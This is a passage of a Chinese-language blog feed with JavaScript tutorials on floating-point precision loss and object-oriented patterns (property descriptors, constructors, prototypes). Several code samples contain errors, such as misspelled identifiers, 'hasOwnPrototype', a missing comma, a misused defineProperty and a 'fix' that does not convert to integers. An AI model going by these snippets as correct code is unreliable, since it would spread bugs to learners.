class="line">    return object;</span><br><span class="line">&#125;();</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;基础&quot;&gt;&lt;a href=&quot;#基础&quot; class=&quot;headerlink&quot; title=&quot;基础&quot;&gt;&lt;/a&gt;基础&lt;/h2&gt;&lt;h3 id=&quot;函数声明和函数表达式&quot;&gt;&lt;a href=&quot;#函数声明和函数表达式&quot; class=&quot;headerlink&quot; title=&quot;函数声明和函数表达式&quot;&gt;&lt;/a&gt;函数声明和函数表达式&lt;/h3&gt;&lt;p&gt;函数声明：重要特征是函数声明提升，在执行代码之前会先读取函数声明。&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;sayHi();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;function sayHi()&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    alert(&amp;quot;Hi&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="前端" scheme="http://dangoying.ink/categories/%E5%89%8D%E7%AB%AF/"/>
    
    
      <category term="前端" scheme="http://dangoying.ink/tags/%E5%89%8D%E7%AB%AF/"/>
    
  </entry>
  
  <entry>
    <title>JS精度丢失问题</title>
    <link href="http://dangoying.ink/JS%E7%B2%BE%E5%BA%A6%E4%B8%A2%E5%A4%B1%E9%97%AE%E9%A2%98.html"/>
    <id>http://dangoying.ink/JS精度丢失问题.html</id>
    <published>2019-03-28T14:56:27.000Z</published>
    <updated>2019-04-01T15:02:19.886Z</updated>
    
    <content type="html"><![CDATA[<p>最近开发的项目新需求中，需要一个金额的输入框，其输入上限为16位整数带两位小数的浮点类型，由于前台显示的金额是字符串型，在传递给后台时使用了<code>parseFloat()</code>方法，却发现在测试校验最大临界值时，发生了四舍五入，最终导致校验失败，由此引发了我对JS浮点数表示和运算了深入理解。</p><a id="more"></a><h2 id="JS浮点数精度丢失的原因"><a href="#JS浮点数精度丢失的原因" class="headerlink" title="JS浮点数精度丢失的原因"></a>JS浮点数精度丢失的原因</h2><p>由于计算机的二进制实现和位数限制，有些数无法有限表示。就像一些无理数不能有限表示，如 圆周率 3.1415926…，1.3333… 等。JS 遵循 IEEE 754 规范，采用双精度存储（double precision），占用 64 bit。</p><p><img src="../assets/20190330/1.jpg" alt="Alt text"></p><ul><li>1位用来表示符号位</li><li>11位用来表示指数</li><li>52位表示尾数</li></ul><p>因为在计算机最底层，数值的运算和操作都是采用二进制实现的，所以计算机没有办法精确表示浮点数，而只能用二进制近似相等的去表示浮点数的小数部分。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0.1 &gt;&gt; 0.0001 1001 1001 1001…（1001无限循环）</span><br><span class="line">0.2 &gt;&gt; 0.0011 0011 0011 0011…（0011无限循环）</span><br></pre></td></tr></table></figure><p>当进行计算或其他操作时时，四舍五入（逢1进，逢0舍）将会导致最终的运算结果存在偏差。</p><p>而大整数也存在同样的问题，因为表示尾数的尾数只有52位，因此 JS 中能精准表示的最大整数是 Math.pow(2, 53)，即十进制9007199254740992。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">9007199254740992     &gt;&gt; 10000000000000...000 // 共计 53 个 0</span><br><span class="line">9007199254740992 + 1 &gt;&gt; 10000000000000...001 // 中间 52 个 0</span><br><span class="line">9007199254740992 + 2 &gt;&gt; 10000000000000...010 // 中间 51 个 0</span><br><span class="line">9007199254740992 + 1 // 丢失        //9007199254740992 </span><br><span class="line">9007199254740992 + 2 // 未丢失      //9007199254740994   </span><br><span class="line">9007199254740992 + 3 // 丢失        //9007199254740992 </span><br><span class="line">9007199254740992 + 4 // 未丢失      //9007199254740996</span><br></pre></td></tr></table></figure><p>由此可知，十进制中的有穷数值，在计算机底层，可能是0、1循环的无限数值。</p><p>在Java、C、C++中，均有对浮点数值的特殊处理，如Java的BigDecimal类型就是用来解决这一浮点数问题。</p><h2 id="常见的出错场合"><a href="#常见的出错场合" class="headerlink" title="常见的出错场合"></a>常见的出错场合</h2><h3 id="浮点数计算、比较："><a href="#浮点数计算、比较：" class="headerlink" title="浮点数计算、比较："></a>浮点数计算、比较：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0.1 + 0.2 != 0.3 // true</span><br></pre></td></tr></table></figure><h3 id="大整数计算、比较："><a href="#大整数计算、比较：" class="headerlink" title="大整数计算、比较："></a>大整数计算、比较：</h3><p>普通的整数计算比较不太容易出错，除非计算范围超出 Math.pow(2, 53)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">9999999999999999 == 10000000000000001 // true</span><br></pre></td></tr></table></figure><h3 id="多位数字符数值转换："><a href="#多位数字符数值转换：" class="headerlink" title="多位数字符数值转换："></a>多位数字符数值转换：</h3><p>这种情况在一些金额的计算中较容易出现，但也是最容易被忽视的一种，当用户在输入框中输入一个位数较多的字符串（不仅仅包含大数值，小数点后位数过长也包含在这一案例中），并在前台使用JS将其转换为数值，得到的结果往往是四舍五入带有偏差的值</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">parseFloat(0.9);    //0.9</span><br><span class="line">parseFloat(9999999999999999.9)    //10000000000000000</span><br><span class="line">parseInt(&quot;9999999999999999&quot;);    //10000000000000000</span><br><span class="line">parseFloat(9.999999999999999);   //10</span><br></pre></td></tr></table></figure><h3 id="toFixed不会四舍五入："><a href="#toFixed不会四舍五入：" class="headerlink" title="toFixed不会四舍五入："></a>toFixed不会四舍五入：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var num = 1.335;</span><br><span class="line">num.toFixed(2);   //1.33</span><br></pre></td></tr></table></figure><h2 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h2><h3 id="浮点数计算、比较：-1"><a href="#浮点数计算、比较：-1" class="headerlink" title="浮点数计算、比较："></a>浮点数计算、比较：</h3><p>通常解决这一问题，采用的都是将浮点部分转换成整数后进行计算</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">//浮点数转换为整数</span><br><span class="line">function toInt(num)&#123;</span><br><span class="line">    var rel = &#123;&#125;;</span><br><span class="line">    var str,pos,len,times;</span><br><span class="line">    str = (num &lt; 0) ? -num + &apos;&apos; : num + &apos;&apos;; </span><br><span class="line">    pos = str.indexOf(&apos;.&apos;);</span><br><span class="line">    len = str.substr(pos+1).length;</span><br><span class="line">    times = Math.pow(10, len);</span><br><span class="line">    rel.times = times;</span><br><span class="line">    rel.num =  num;</span><br><span class="line">    return rel;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//计算过程</span><br><span class="line">function operate(a,b,op)&#123;</span><br><span class="line">    var d1 = toInt(a);</span><br><span class="line">    var d2 = toInt(b);</span><br><span class="line">    var max = d1.times &gt; d2.times ? d1.times : d2.times;</span><br><span class="line">    var rel;</span><br><span class="line">    switch(op)&#123;</span><br><span class="line">        case &quot;+&quot; :</span><br><span class="line">            rel = (d1.num * max + d2.num * max) / max;</span><br><span class="line">            break;</span><br><span class="line">        case &quot;-&quot; :</span><br><span class="line">            rel = (d1.num * max - d2.num * max) / max;</span><br><span class="line">            break;</span><br><span class="line">        case &quot;*&quot; :</span><br><span class="line">            rel = ((d1.num * max) * (d2.num * max)) / (max * max);</span><br><span class="line">            break;</span><br><span class="line">        case &quot;/&quot; :</span><br><span class="line">            rel = (d1.num * max) / (d2.num * max);</span><br><span class="line">            break;</span><br><span class="line">    &#125;</span><br><span class="line">    return rel;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var rel = operate(0.3,0.1,&quot;+&quot;);   //0.4</span><br></pre></td></tr></table></figure><h3 id="多位数数值转换："><a href="#多位数数值转换：" class="headerlink" title="多位数数值转换："></a>多位数数值转换：</h3><p>前台不对这类字符串进行数值转换，传到后台后，由后台进行处理</p><h3 id="toFix的修复："><a href="#toFix的修复：" class="headerlink" title="toFix的修复："></a>toFix的修复：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">function toFixed(num, s) &#123;</span><br><span class="line">    var times = Math.pow(10, s)</span><br><span class="line">    var des = num * times + 0.5</span><br><span class="line">    des = parseInt(des, 10) / times</span><br><span class="line">    return des + &apos;&apos;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;最近开发的项目新需求中，需要一个金额的输入框，其输入上限为16位整数带两位小数的浮点类型，由于前台显示的金额是字符串型，在传递给后台时使用了&lt;code&gt;parseFloat()&lt;/code&gt;方法，却发现在测试校验最大临界值时，发生了四舍五入，最终导致校验失败，由此引发了我对JS浮点数表示和运算了深入理解。&lt;/p&gt;
    
    </summary>
    
      <category term="前端" scheme="http://dangoying.ink/categories/%E5%89%8D%E7%AB%AF/"/>
    
    
      <category term="前端" scheme="http://dangoying.ink/tags/%E5%89%8D%E7%AB%AF/"/>
    
  </entry>
  
  <entry>
    <title>JS面向对象程序设计</title>
    <link href="http://dangoying.ink/JS%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1.html"/>
    <id>http://dangoying.ink/JS面向对象程序设计.html</id>
    <published>2019-03-24T03:41:03.000Z</published>
    <updated>2019-03-25T14:16:30.561Z</updated>
    
    <content type="html"><![CDATA[<h2 id="属性类型"><a href="#属性类型" class="headerlink" title="属性类型"></a>属性类型</h2><h3 id="数据属性"><a href="#数据属性" class="headerlink" title="数据属性"></a>数据属性</h3><table><thead><tr><th style="text-align:left">属性名</th><th style="text-align:left">解释</th></tr></thead><tbody><tr><td style="text-align:left">[[Configurable]]</td><td style="text-align:left">表示能否通过delete删除属性从而重新定义属性，默认为true</td></tr><tr><td style="text-align:left">[[Enumerable]]</td><td style="text-align:left">表示能否通过for-in循环返回属性，默认为true</td></tr><tr><td style="text-align:left">[[Writable]]</td><td style="text-align:left">表示能否修改属性的值，默认为true</td></tr><tr><td style="text-align:left">[[Value]]</td><td style="text-align:left">包含这个属性的数值，默认为undefined</td></tr></tbody></table><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">var person = &#123;&#125;;</span><br><span class="line">Object.defineProperty(person,&quot;name&quot;,&#123;</span><br><span class="line">    writable: false,</span><br><span class="line">    value: &quot;Nicholas&quot;</span><br><span class="line">&#125;);</span><br><span class="line">alert(person.name);  // &quot;Nicholas&quot;</span><br><span class="line">person.name = &quot;Greg&quot;;</span><br><span class="line">alert(person.name);  // &quot;Nicholas&quot;,通过修改属性使之不能被修改</span><br></pre></td></tr></table></figure><a id="more"></a><h3 id="访问器属性"><a href="#访问器属性" class="headerlink" title="访问器属性"></a>访问器属性</h3><table><thead><tr><th style="text-align:left">属性名</th><th style="text-align:left">解释</th></tr></thead><tbody><tr><td style="text-align:left">[[Configurable]]</td><td style="text-align:left">表示能否修改属性的特性，或者能否把属性修改为数据属性，默认为true</td></tr><tr><td style="text-align:left">[[Enumerable]]</td><td style="text-align:left">表示能否通过for-in循环返回属性，默认为true</td></tr><tr><td style="text-align:left">[[Get]]</td><td style="text-align:left">在读取属性时调用的函数，默认为undefined</td></tr><tr><td style="text-align:left">[[Set]]</td><td style="text-align:left">在写入属性时调用的函数，默认为undefined</td></tr></tbody></table><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">var book = &#123;</span><br><span class="line">    _year: 2004,</span><br><span class="line">    edition: 1</span><br><span class="line">&#125;;</span><br><span class="line">Object.defineProperty(book,&quot;year&quot;,&#123;</span><br><span class="line">    get: function()&#123;</span><br><span class="line">        return this._year;</span><br><span class="line">    &#125;</span><br><span class="line">    set: function(newValue)&#123;</span><br><span class="line">        if(newVale &gt; 2004)&#123;</span><br><span class="line">            this._year = newValue;</span><br><span class="line">            this.edition += newValue - 2004;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line">book.year = 2005;</span><br><span class="line">alert(book.edition);  // 2,访问属性只能用Object.defineProperty定义</span><br></pre></td></tr></table></figure><h3 id="定义多个属性"><a href="#定义多个属性" class="headerlink" title="定义多个属性"></a>定义多个属性</h3><p>使用Object.defineProperty方法定义多个属性</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">var book = &#123;&#125;;</span><br><span class="line">Object.defineProperty(book,&#123;</span><br><span class="line">    _year: &#123;</span><br><span class="line">        writable: true,</span><br><span class="line">        value: 2004</span><br><span class="line">    &#125;,</span><br><span class="line">    edition: &#123;</span><br><span class="line">        wirtable: true,</span><br><span class="line">        value: 1</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h3 id="读取属性的特性"><a href="#读取属性的特性" class="headerlink" title="读取属性的特性"></a>读取属性的特性</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var descriptor = Object.getOwnPropertyDescriptor(book,&quot;_year&quot;);</span><br><span class="line">alert(descriptor.value);  //2004</span><br><span class="line">alert(descriptor.configurable);   //false</span><br><span class="line">alert(typeof descriptor.get);    //&quot;undefined&quot;</span><br></pre></td></tr></table></figure><h2 id="创建对象"><a href="#创建对象" class="headerlink" title="创建对象"></a>创建对象</h2><h3 id="工厂模式"><a href="#工厂模式" class="headerlink" title="工厂模式"></a>工厂模式</h3><p>抽象了创建具体对象的过程</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">function createPerson(name,age,job)&#123;</span><br><span class="line">    var o = new Object();</span><br><span class="line">    o.name = name;</span><br><span class="line">    o.age = age;</span><br><span class="line">    o.job = job;</span><br><span class="line">    o.sayName = function()&#123;</span><br><span class="line">        alert(this.name);</span><br><span class="line">    &#125;;</span><br><span class="line">    return o;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="构造函数模式"><a href="#构造函数模式" class="headerlink" title="构造函数模式"></a>构造函数模式</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">function Person(name,age,job)&#123;</span><br><span class="line">    this.name = name;</span><br><span class="line">    this.age = age;</span><br><span class="line">    this.job = job;</span><br><span class="line">    this.sayName = function()&#123;</span><br><span class="line">        alert(this.name);</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br><span class="line">var person1 = new Person(&quot;Nicholas&quot;,29,&quot;Software Engineer&quot;);</span><br><span class="line"></span><br><span class="line">// 使用call实现在特殊作用于中调用Person函数</span><br><span class="line">var o = new Object();</span><br><span class="line">Person.call(o,&quot;Kristen&quot;,25,&quot;Nurse&quot;);</span><br><span class="line">o.sayName();   //&quot;Kristen&quot;</span><br></pre></td></tr></table></figure><p>此方法特点：</p><ul><li>没有显示地创建对象</li><li>直接将属性方法赋给了his对象</li><li>没有return语句</li><li>不同实例上的同名函数每次都是新创建初始化，他们之间不相等<br>最好将函数定义转移到构造函数外</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">function Person(name,age,job)&#123;</span><br><span class="line">    this.name = name;</span><br><span class="line">    this.age = age;</span><br><span class="line">    this.job = job;</span><br><span class="line">    this.sayName = sayName;</span><br><span class="line">&#125;</span><br><span class="line">function sayName()&#123;</span><br><span class="line">    alert(this.name);</span><br><span class="line">&#125;</span><br><span class="line">var person1 = new Person(&quot;Nicholas&quot;,29,&quot;Software Engineer&quot;);</span><br></pre></td></tr></table></figure><h3 id="原型模式"><a href="#原型模式" class="headerlink" title="原型模式"></a>原型模式</h3><p>创建的每个函数都有一个prototype属性，这个属性指向一个对象，该对象的用途是包含可以由特定类型的所有实例共享的属性和方法。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">function Person()&#123;</span><br><span class="line">&#125;</span><br><span class="line">Person.prototype.name = &quot;Nicholas&quot;;</span><br><span class="line">Person.prototype.age = 29;</span><br><span class="line">Person.prototype.job = &quot;Software Engineer&quot;;</span><br><span class="line">Person.prototype.sayName = function()&#123;</span><br><span class="line">    alert(this.name);</span><br><span class="line">&#125;;</span><br><span class="line">var person1 = new Person();</span><br><span class="line">person1.sayName();   //&quot;Nicholas&quot;,来自原型</span><br></pre></td></tr></table></figure><p><img src="../assets/jsoop/20190324153411.png" alt="Alt text"></p><p>可以通过isPrototypeOf来确定对象之间是否存在这种关系</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">alert(Person.prototype.isPrototypeOf(person1));   //true</span><br><span class="line">alert(Person.getPrototypeOf(person) == Person.prototype);   //true</span><br><span class="line">alert(Obeject.getPrototypeOf(person1).name);   //&quot;Nicholas&quot;</span><br></pre></td></tr></table></figure><p>可以通过hasOwnProperty来检测一个属性是否存在于实例中，只有存在于实例中，才会返回true</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">alert(person1.hasOwnPrototype(&quot;name&quot;));   //false</span><br><span class="line">person1.name = &quot;Greg&quot;;</span><br><span class="line">alert(person1.name);   //&quot;Greg&quot;,来自实例</span><br><span class="line">alert(person1.hasOwnPrototype(&quot;name&quot;));   //true</span><br><span class="line">delete person1.name;</span><br><span class="line">alert(person1.name);   //&quot;Nicholas&quot;,来自原型</span><br><span class="line">alert(person1.hasOwnPrototype(&quot;name&quot;));   //false</span><br></pre></td></tr></table></figure><p>in操作符会在通过对象能够访问给定属性时返回true，无论其在实例还是原型中</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alert(&quot;name&quot; in person1);   //true</span><br></pre></td></tr></table></figure><p>for-in循环，返回的是所有能够通过对象访问、可枚举的属性</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">var o = &#123;</span><br><span class="line">    toString: function()&#123;</span><br><span class="line">        return &quot;My Object&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line">for(var prop in o)&#123;</span><br><span class="line">    if(pop == &quot;toString&quot;)&#123;</span><br><span class="line">        alert(&quot;Found toString&quot;);   //IE中不会显示，认为原型中的toString被屏蔽</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用Object.key可以取得所有可枚举的实力属性</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">var keys = Object.keys(Person.prototype);</span><br><span class="line">alert(keys);   //&quot;name,age,job,sayName&quot;</span><br><span class="line">var p1 = new Person();</span><br><span class="line">p1.name = &quot;Rob&quot;;</span><br><span class="line">p1.age = 31;</span><br><span class="line">var p1Keys = Object.keys(p1);</span><br><span class="line">alert(p1Keys);   //&quot;name,age&quot;</span><br></pre></td></tr></table></figure><p>更简单的原型创建语法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">function Person()&#123;</span><br><span class="line">&#125;</span><br><span class="line">Person.prototype = &#123;</span><br><span class="line">    name: &quot;Nicholas&quot;,</span><br><span class="line">    age: 29,</span><br><span class="line">    job: &quot;Software Engineer&quot;,</span><br><span class="line">    sayName: function()&#123;</span><br><span class="line">        alert(this.name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">// 此时constructor不再指向Person了，如果需要可以将constructor的值设为Person</span><br></pre></td></tr></table></figure><p>对原型对象所做的修改可以立即从实例上反映出来</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">var friend = new Person();</span><br><span class="line">Person.prototype.sayHi = function()&#123;</span><br><span class="line">    alert(&quot;Hi&quot;);</span><br><span class="line">&#125;</span><br><span class="line">friends.sayHi();   //&quot;Hi&quot;</span><br></pre></td></tr></table></figure><p>但重写整个原型对象就不可以了，此时constructor指向新创建的对象</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">var Person()&#123;</span><br><span class="line">&#125;</span><br><span class="line">var friend = new Person();</span><br><span class="line">Person.prototype = &#123;</span><br><span class="line">    constructor: Person,</span><br><span class="line">    name: &quot;Nicholas&quot;,</span><br><span class="line">    age: 29,</span><br><span class="line">    job: &quot;Software Engineer&quot;,</span><br><span class="line">    sayName: function()&#123;</span><br><span class="line">        alert(this.name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line">friends.sayName();   //error</span><br></pre></td></tr></table></figure><p>通过原生对象原型，可以取得所有默认方法的引用，而且也可以定义新方法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">String.prototype.startsWith = function(text)&#123;</span><br><span class="line">    return this.indexOf(text) == 0;</span><br><span class="line">&#125;;</span><br><span class="line">var msg = &quot;Hello world&quot;;</span><br><span class="line">alert(msg.startsWith(&quot;Hello&quot;));   //true</span><br></pre></td></tr></table></figure><p>原生对象存在缺点，包含引用类型值的属性将被所有实例共享，例如属性中包含数组</p><h3 id="组合使用构造函数和原型模式"><a href="#组合使用构造函数和原型模式" class="headerlink" title="组合使用构造函数和原型模式"></a>组合使用构造函数和原型模式</h3><p>构造函数模式用于定义实例属性，而原型模式用于定义方法和共享的属性</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">function Person(name,age,job)&#123;</span><br><span class="line">    this.name = name;</span><br><span class="line">    this.age = age;</span><br><span class="line">    this.job = job;</span><br><span class="line">    this.friends = [&quot;Shelly&quot;,&quot;Court&quot;];</span><br><span class="line">&#125;</span><br><span class="line">Person.prototype = &#123;</span><br><span class="line">    constructor: Person,</span><br><span class="line">    sayName: function()&#123;</span><br><span class="line">        alert(this.name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line">var person1 = new Person(&quot;Nicholas&quot;,29,&quot;SoftWare Engineer&quot;);</span><br><span class="line">var person2 = new Person(&quot;Greg&quot;,27,&quot;Doctor&quot;);</span><br><span class="line">person1.friends.push(&quot;Van&quot;);</span><br><span class="line">alert(person1.friends);   //&quot;Shelly,Court,Van&quot;</span><br><span class="line">alert(person2.friends);   //&quot;Shelly,Court&quot;</span><br></pre></td></tr></table></figure><h3 id="动态原型模式"><a href="#动态原型模式" class="headerlink" title="动态原型模式"></a>动态原型模式</h3><p>通过检查某个应该存在的方法是否有效，来决定是否需要初始化原型</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">function Person(name,age,job)&#123;</span><br><span class="line">    this.name = name;</span><br><span class="line">    this.age = age;</span><br><span class="line">    this.job = job;</span><br><span class="line">    if(typeof this.sayName != &quot;function&quot;)&#123;</span><br><span class="line">        Person.prototype.sayName = function()&#123;</span><br><span class="line">            alert(this.name);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="寄生构造函数模式"><a href="#寄生构造函数模式" class="headerlink" title="寄生构造函数模式"></a>寄生构造函数模式</h3><p>该模式用来为对象创建构造函数，以此创建一个具有额外方法的特殊对象</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">function SpecialArray()&#123;</span><br><span class="line">    var values = new Array();</span><br><span class="line">    values.push.apply(values,arguments);</span><br><span class="line">    values.toPipedString = function()&#123;</span><br><span class="line">        return this.join(&quot;|);</span><br><span class="line">    